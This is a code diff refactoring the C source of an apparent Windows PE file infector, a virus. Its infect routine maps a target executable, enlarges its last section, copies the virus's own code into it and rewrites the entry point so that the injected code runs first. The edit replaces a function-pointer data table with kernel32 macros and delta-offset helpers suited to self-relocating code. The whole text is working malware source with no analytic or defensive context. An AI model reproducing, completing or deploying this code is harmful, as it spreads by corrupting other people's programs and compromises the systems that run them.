@@ -1,7 +1,8 @@
 #include <stdint.h>
 #include <windows.h>
 
-#include "data.h"
+#include "delta.h"
+#include "function_kernel32.h"
 #include "infect.h"
 #include "oep.h"
 #include "pe.h"
@@ -32,17 +33,15 @@ int infect(const char *filename, void *entry_function_addr) {
         file_view.size = extended_size;
         if (open_file_view(filename, &file_view) == 0) {
             IMAGE_NT_HEADERS *nt_headers =
-                get_nt_header(file_view.start_address);
+                get_nt_header_by_base(file_view.start_address);
             modify_headers(nt_headers);
             void *target_code_begin = copy_code(nt_headers, &file_view);
             uint32_t entry_offset =
                 (uint32_t)BYTE_DIFF(entry_function_addr, code_begin);
 
             modify_entrypoint(nt_headers, entry_offset, target_code_begin);
-            reset_data_pointer(target_code_begin);
 
-            get_data()->function_list.flushViewOfFile(file_view.start_address,
-                                                      extended_size);
+            FLUSH_VIEW_OF_FILE(file_view.start_address, extended_size);
 
             close_file_view(&file_view);
         } else {
@@ -85,7 +84,7 @@ static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view) {
     IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
     void *target_code_begin =
         BYTE_OFFSET(file_view->start_address, section_header->PointerToRawData);
-    memcp(BYTE_OFFSET(code_begin, get_data()->delta_offset), target_code_begin,
+    memcp(BYTE_OFFSET(code_begin, get_delta_offset()), target_code_begin,
           CODE_SIZE);
     return target_code_begin;
 }
@@ -119,7 +118,7 @@ static int can_infect(const char *filename) {
         return 0;
     }
 
-    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
+    IMAGE_NT_HEADERS *nt_headers = get_nt_header_by_base(fw.start_address);
     IMAGE_SECTION_HEADER *section_header =
         get_section_header(nt_headers, nt_headers->FileHeader.NumberOfSections);
 
@@ -146,7 +145,7 @@ static uint32_t get_extended_file_size(const char *filename) {
         PRINT_DEBUG("could not open view of file");
         return 0;
     }
-    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
+    IMAGE_NT_HEADERS *nt_headers = get_nt_header_by_base(fw.start_address);
     uint32_t extended_size =
         fw.size + nt_headers->OptionalHeader.FileAlignment +
         align_value(CODE_SIZE, nt_headers->OptionalHeader.FileAlignment);
@@ -155,59 +154,46 @@ static uint32_t get_extended_file_size(const char *filename) {
 }
 
 static int open_file_view(const char *filename, file_view_t *file_view) {
-    data_t *data = get_data();
 
-    if (data == NULL) {
-        PRINT_DEBUG("could not get data");
-        return -1;
-    }
-
-    file_view->h_file = data->function_list.create_file_a(
-        filename, GENERIC_READ | GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL, NULL);
+    file_view->h_file =
+        CREATE_FILE_A(filename, GENERIC_READ | GENERIC_WRITE,
+                      FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
+                      FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (file_view->h_file == INVALID_HANDLE_VALUE) {
         return 1;
     }
 
     if (file_view->size == 0) {
-        file_view->size =
-            (DWORD)data->function_list.get_file_size(file_view->h_file, NULL);
+        file_view->size = GET_FILE_SIZE(file_view->h_file, NULL);
         if (file_view->size == INVALID_FILE_SIZE) {
-            data->function_list.close_handle(file_view->h_file);
+            CLOSE_HANDLE(file_view->h_file);
             return 2;
         }
     }
 
-    file_view->h_map = data->function_list.create_file_mapping_a(
+    file_view->h_map = CREATE_FILE_MAPPING_A(
         file_view->h_file, NULL, PAGE_READWRITE, 0, file_view->size, NULL);
 
     if (file_view->h_map == NULL) {
-        data->function_list.close_handle(file_view->h_file);
+        CLOSE_HANDLE(file_view->h_file);
         return 3;
     }
 
-    file_view->start_address = (void *)data->function_list.map_view_of_file(
+    file_view->start_address = (void *)MAP_VIEW_OF_FILE(
         file_view->h_map, FILE_MAP_ALL_ACCESS, 0, 0, file_view->size);
 
     if (file_view->start_address == NULL) {
-        data->function_list.close_handle(file_view->h_map);
-        data->function_list.close_handle(file_view->h_file);
+        CLOSE_HANDLE(file_view->h_map);
+        CLOSE_HANDLE(file_view->h_file);
         return 4;
     }
     return 0;
 }
 
 static void close_file_view(file_view_t *file_view) {
-    data_t *data = get_data();
-    if (data != NULL) {
-        data->function_list.unmap_view_of_file(
-            (LPCVOID)file_view->start_address);
-        data->function_list.close_handle(file_view->h_map);
-        data->function_list.close_handle(file_view->h_file);
-    } else {
-        PRINT_DEBUG("could not get data");
-    }
+    UNMAP_VIEW_OF_FILE((LPCVOID)file_view->start_address);
+    CLOSE_HANDLE(file_view->h_map);
+    CLOSE_HANDLE(file_view->h_file);
     memzero(file_view, sizeof(file_view_t));
 }
